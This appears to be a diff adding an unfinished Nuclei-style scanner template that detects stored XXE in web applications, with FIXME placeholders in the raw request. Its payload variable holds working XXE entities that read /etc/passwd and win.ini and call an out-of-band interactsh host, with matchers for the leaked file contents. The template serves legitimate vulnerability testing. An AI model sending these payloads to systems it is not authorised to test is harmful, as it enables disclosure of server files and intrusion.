@@ -1,0 +1,107 @@
+id: stored-xxe
+
+info:
+  name: Stored XXE Detection
+  author: Trackflaw
+  severity: high
+  tags: xxe, storedxxe, dast
+  description: |
+    Detects a stored XXE vulnerability in a web application in injecting
+    a payload into each one to check for reflective patterns in the HTTP response.
+    XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker
+    to interfere with an application's processing of XML data. It often allows an attacker to view files on the
+    application server filesystem, and to interact with any back-end or external systems that the application itself
+    can access.
+  reference:
+    - https://portswigger.net/web-security/xxe/blind
+
+variables:
+  payload: '<!DOCTYPE {{wonderfully}} [ <!ENTITY {{wonderfully}} SYSTEM "file:///c:/windows/win.ini"> ]><x>&{{wonderfully}};</x>\
+  <!DOCTYPE {{sun}} [ <!ENTITY {{sun}} SYSTEM "file:////etc/passwd"> ]><x>&{{sun}};</x>\
+  <!DOCTYPE {{interact}} [ <!ENTITY {{interact}} SYSTEM "http://{{interactsh-url}}"> ]><x>&{{interact}};</x>'
+
+http:
+  - id: inject-payload
+  - raw:
+    - |
+      FIXME_METHOD FIXME_ACTION?FIXME_ARGUMENT HTTP/1.1
+      Host: {{Hostname}}
+      Connection: close
+      Cookie: FIXME_COOKIES
+      Origin: {{BaseURL}}
+      Referer: {{BaseURL}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
+      Accept: application/json, text/javascript, */*; q=0.01
+      Accept-Language: en-US,en;q=0.9
+      Content-Type: FIXME_ENCTYPE
+      X-Requested-With: XMLHttpRequest
+
+      FIXME_BODY
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+
+  - id: check-payload
+    method: "GET"
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.59 Safari/537.36
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        name: linux
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        name: windows
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+
+# headless:
+#   - steps:
+#       - args:
+#           url: "{{BaseURL}}"
+#         action: navigate
+
+#       - action: waitload
+
+#       - action: script
+#         args:
+#           code: "console.log('{{randint}}');"
+#         name: check_console_log
+
+#       - action: waitstable
+
+#     matchers:
+#       - type: word
+#         part: check_console_log
+#         words:
+#           - "{{randint}}"
